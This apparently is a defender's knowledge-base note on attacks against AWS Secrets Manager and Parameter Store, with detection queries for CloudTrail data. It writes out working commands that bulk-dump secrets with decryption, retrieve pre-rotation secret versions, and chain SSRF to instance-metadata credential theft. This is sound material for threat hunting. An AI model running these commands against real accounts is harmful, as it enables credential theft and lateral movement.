---
title: AWS Secrets Manager and Parameter Store Attacks
date: 2026-03-13
type: ttp
mitre_id: T1552.001, T1555, T1083
mitre_tactic: Credential Access, Discovery
threat_actors: []
tools_used: [aws-cli, Pacu]
platforms: [AWS]
tags:
  - type/ttp
  - status/active
  - platform/aws
  - category/credential-access
  - category/secrets
source:
  url: https://hackingthe.cloud/aws/general-knowledge/using_stolen_iam_credentials/
  author: hackingthe.cloud
  date: 2024
---

## Summary
AWS Secrets Manager and SSM Parameter Store are the primary credential repositories in AWS environments — storing database passwords, API keys, OAuth tokens, TLS certificates, and service credentials. Post-compromise, these are the first services attackers enumerate to harvest lateral movement material. The most dangerous API calls (`GetSecretValue`, `GetParameter`) are CloudTrail data events not logged by default, creating a significant detection blind spot in most AWS environments.

## How It Works

### Step 1 — Identify Available Secrets
Using any credential with `secretsmanager:ListSecrets` or `ssm:DescribeParameters`, attackers enumerate all available secrets and parameters:
```bash
aws secretsmanager list-secrets
aws ssm describe-parameters
```

### Step 2 — Assess Permissions
Not all credentials can retrieve all secrets. Attackers check what they can access and identify high-value targets by name and description.

### Step 3 — Bulk Retrieval
Mass-dump all accessible secrets:
```bash
# Secrets Manager mass dump
aws secretsmanager list-secrets --query 'SecretList[*].Name' --output text | \
  tr '\t' '\n' | while read name; do
    aws secretsmanager get-secret-value --secret-id "$name" --query 'SecretString' --output text 2>/dev/null
  done

# Parameter Store full dump
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption
```

### Step 4 — Leverage Harvested Credentials
Retrieved secrets enable:
- **Database access** — RDS, Aurora, DynamoDB credentials
- **API authentication** — third-party service tokens
- **Further IAM escalation** — credentials for other AWS accounts/services
- **Lateral movement** — credentials for internal systems

---

## Technical Reference

### Target Services

#### AWS Secrets Manager
Stores secrets (credentials, API keys, database passwords, certificates) with versioning, rotation, and cross-account access. Each secret has a name, ARN, and optionally a KMS encryption key.

#### AWS SSM Parameter Store
Stores configuration data and secrets as key-value pairs in a hierarchical path structure. Three types:
- `String` — plaintext, unencrypted
- `StringList` — comma-separated plaintext
- `SecureString` — KMS-encrypted

Common naming conventions attackers target:
```
/prod/database/password
/app/api_key
/aws/reference/secretsmanager/<secret-name>    # Parameter Store reference to Secrets Manager
/PROD/RDS/MYSQL_PASSWORD
```

### Required IAM Permissions

#### Secrets Manager
| Permission | Action |
|---|---|
| `secretsmanager:ListSecrets` | Enumerate all secret names and ARNs |
| `secretsmanager:DescribeSecret` | Get metadata (tags, rotation config, KMS key) |
| `secretsmanager:GetSecretValue` | **Retrieve the actual secret value** |
| `secretsmanager:ListSecretVersionIds` | Enumerate versions (useful if current value rotated) |

#### Parameter Store
| Permission | Action |
|---|---|
| `ssm:DescribeParameters` | List all parameters and metadata |
| `ssm:GetParameter` | Retrieve a single parameter value |
| `ssm:GetParameters` | Retrieve up to 10 parameters at once |
| `ssm:GetParametersByPath` | Retrieve all parameters under a path hierarchy |
| `kms:Decrypt` | Required to decrypt `SecureString` parameters |

### Attack Commands

#### Secrets Manager Enumeration
```bash
# List all secrets (returns names and ARNs)
aws secretsmanager list-secrets

# Get metadata for a specific secret
aws secretsmanager describe-secret --secret-id <secret-name-or-arn>

# Retrieve the actual secret value
aws secretsmanager get-secret-value --secret-id <secret-name-or-arn>

# Enumerate all version IDs (useful if current value was rotated)
aws secretsmanager list-secret-version-ids --secret-id <secret-name-or-arn>

# Retrieve a previous version
aws secretsmanager get-secret-value --secret-id <secret-name> --version-id <version-id>

# Mass dump all secrets (bash loop)
aws secretsmanager list-secrets --query 'SecretList[*].Name' --output text | \
  tr '\t' '\n' | \
  while read name; do
    echo "=== $name ===";
    aws secretsmanager get-secret-value --secret-id "$name" --query 'SecretString' --output text 2>/dev/null;
  done
```

#### Parameter Store Enumeration
```bash
# List all parameters
aws ssm describe-parameters

# Get a specific parameter (--with-decryption for SecureString)
aws ssm get-parameter --name "/prod/database/password" --with-decryption

# Get all parameters under a path
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption

# Get multiple parameters at once
aws ssm get-parameters --names "/prod/db/pass" "/prod/api/key" --with-decryption
```

#### Pacu Automation
```bash
# Pacu module — enumerates both Secrets Manager and Parameter Store
run aws__enum_secrets

# Results stored in Pacu database, includes all retrieved values
```

### CloudTrail Event Coverage

| API Call | Event Type | Logged by Default? |
|---|---|---|
| `ListSecrets` | Management event | **Yes** |
| `DescribeSecret` | Management event | **Yes** |
| `GetSecretValue` | **Data event** | **NO** — requires explicit enablement |
| `ListSecretVersionIds` | Management event | **Yes** |
| `ssm:DescribeParameters` | Management event | **Yes** |
| `ssm:GetParameter` | **Data event** | **NO** — requires explicit enablement |
| `ssm:GetParameters` | **Data event** | **NO** — requires explicit enablement |
| `ssm:GetParametersByPath` | **Data event** | **NO** — requires explicit enablement |

> **Critical detection gap**: The actual credential retrieval calls are data events. Without explicit CloudTrail data event logging enabled for these services, attackers can dump all secrets with zero CloudTrail evidence.

### Attack Chains

#### Chain 1: IAM Privesc → Secret Dump → Lateral Movement
```
IAM credential escalation (AttachUserPolicy / CreatePolicyVersion)
    ↓
aws secretsmanager list-secrets
    ↓
aws secretsmanager get-secret-value (x all secrets)
    ↓
Find DB password / API key / another IAM credential
    ↓
Authenticate to RDS, API service, or escalate again
```

#### Chain 2: IMDS Credential Theft → Parameter Store Dump
```
SSRF → 169.254.169.254/latest/meta-data/iam/security-credentials/
    ↓
Temporary credentials for EC2 instance role
    ↓
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption
    ↓
Harvest all application configuration secrets
```

#### Chain 3: Old Secret Versions (Rotation Bypass)
```
Current secret value rotated by security team (attacker locked out)
    ↓
aws secretsmanager list-secret-version-ids --secret-id TARGET
    ↓
Previous version IDs visible in response
    ↓
aws secretsmanager get-secret-value --version-id PREVIOUS_VERSION
    ↓
Retrieve credential value before rotation
```

### Key Attacker Observables
- `ListSecrets` from an identity that doesn't normally call Secrets Manager
- `DescribeSecret` called in rapid succession across many secrets (enumeration)
- `GetSecretValue` calls if data events ARE enabled — particularly bulk calls
- `GetParametersByPath` with `--path /` and `--recursive` (full dump)
- Same identity accessing secrets across multiple services in a short window

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|---|---|---|
| Credentials in Files | T1552.001 | Secrets stored in Parameter Store as plaintext strings |
| Credentials from Password Stores | T1555 | Secrets Manager as managed credential store |
| File and Directory Discovery | T1083 | Enumerating secret names and parameter paths |

---

## Detection Opportunities

### Critical Detection Gap
`GetSecretValue` and `GetParameter`/`GetParameters`/`GetParametersByPath` are **CloudTrail data events** — they are not logged unless explicitly enabled per-service. Most environments do not have this enabled.

### Behavioral Indicators
- `ListSecrets` or `DescribeParameters` from identities that have never accessed these services
- Rapid sequential `DescribeSecret` calls across many secrets (enumeration pattern)
- `GetSecretValue` bulk calls from a single identity in a short window (if data events enabled)
- `GetParametersByPath` with `--path /` and `--recursive` — full dump signature
- `kms:Decrypt` calls associated with `ssm` or `secretsmanager` service principals from unexpected identities
- Cross-service pattern: IAM escalation event followed within minutes by secrets enumeration

### Artifacts
- CloudTrail `ListSecrets` event with no historical baseline from that identity
- `DescribeSecret` called on secrets the identity has no documented business reason to access
- `GetSecretValue` volume spike if data events are enabled

---

## Query Stubs

### CrowdStrike FQL
```fql
// Secrets Manager enumeration — ListSecrets from new/unexpected identity
event_simpleName=CloudTrailEvent
| EventName=ListSecrets
| table _time, UserIdentityArn, SourceIPAddress, AWSRegion

// DescribeSecret in bulk — enumeration pattern
event_simpleName=CloudTrailEvent
| EventName=DescribeSecret
| stats count(_time) as call_count by UserIdentityArn
| where call_count > 10
| sort -call_count

// GetSecretValue — only visible if data events enabled
event_simpleName=CloudTrailEvent
| EventName=GetSecretValue
| table _time, UserIdentityArn, RequestParameters, SourceIPAddress

// Parameter Store full dump
event_simpleName=CloudTrailEvent
| EventName=GetParametersByPath
| table _time, UserIdentityArn, RequestParameters, SourceIPAddress
```

### Databricks SQL
```sql
-- Secrets Manager enumeration from new identities
SELECT
  event_time,
  user_identity_arn,
  event_name,
  source_ip_address,
  aws_region
FROM cloudtrail_events
WHERE event_name IN ('ListSecrets', 'DescribeSecret', 'GetSecretValue')
  AND event_time >= CURRENT_DATE - INTERVAL 30 DAYS
ORDER BY event_time;

-- Bulk GetSecretValue — high volume from single identity (data events required)
SELECT
  DATE_TRUNC('hour', event_time) AS hour,
  user_identity_arn,
  COUNT(*) AS secret_access_count
FROM cloudtrail_events
WHERE event_name = 'GetSecretValue'
  AND event_time >= CURRENT_DATE - INTERVAL 30 DAYS
GROUP BY 1, 2
HAVING secret_access_count > 5
ORDER BY secret_access_count DESC;

-- Parameter Store full dump signature
SELECT
  event_time,
  user_identity_arn,
  event_name,
  request_parameters,
  source_ip_address
FROM cloudtrail_events
WHERE event_name IN ('GetParametersByPath', 'GetParameters', 'GetParameter')
  AND event_time >= CURRENT_DATE - INTERVAL 30 DAYS
ORDER BY event_time DESC;

-- IAM escalation followed by secrets access (multi-stage correlation)
WITH iam_events AS (
  SELECT user_identity_arn, event_time AS iam_time
  FROM cloudtrail_events
  WHERE event_name IN (
    'AttachUserPolicy','AttachRolePolicy','CreateAccessKey',
    'PutUserPolicy','CreatePolicy','SetDefaultPolicyVersion'
  )
  AND event_time >= CURRENT_DATE - INTERVAL 30 DAYS
),
secrets_events AS (
  SELECT user_identity_arn, event_time AS secret_time
  FROM cloudtrail_events
  WHERE event_name IN ('ListSecrets','GetSecretValue','GetParametersByPath')
  AND event_time >= CURRENT_DATE - INTERVAL 30 DAYS
)
SELECT
  i.user_identity_arn,
  i.iam_time,
  s.secret_time,
  DATEDIFF('minute', i.iam_time, s.secret_time) AS minutes_between
FROM iam_events i
JOIN secrets_events s ON i.user_identity_arn = s.user_identity_arn
WHERE s.secret_time > i.iam_time
  AND DATEDIFF('minute', i.iam_time, s.secret_time) <= 60
ORDER BY minutes_between;
```

---

## Tools Reference

| Tool | Purpose |
|---|---|
| AWS CLI | Manual enumeration and exploitation |
| Pacu `aws__enum_secrets` | Automated enumeration of both Secrets Manager and Parameter Store |

---

## Threat Actor Usage

| Actor Type | Common Method |
|---|---|
| Post-compromise attacker | Mass `GetSecretValue` dump after IAM privesc |
| Insider threat | Targeted secret access to specific credentials |
| Automated attack tools | Pacu `aws__enum_secrets` module |

---

## References
- [hackingthe.cloud: Using Stolen IAM Credentials](https://hackingthe.cloud/aws/general-knowledge/using_stolen_iam_credentials/)
- [AWS: Logging Secrets Manager API Calls with CloudTrail](https://docs.aws.amazon.com/secretsmanager/latest/userguide/monitoring.html)
- [Rhino Security Labs: Pacu AWS Exploitation Framework](https://github.com/RhinoSecurityLabs/pacu)

## Related Notes
- [[Hunt - AWS Secrets Manager Credential Harvesting]] — active hunt hypothesis with queries
- [[AWS IAM Privilege Escalation]] — escalation enabling secret access
- [[EC2 Instance Metadata Service Abuse]] — IMDS credential theft enabling secret access
- [[30 - Knowledge/Cybersecurity/Research Index]]
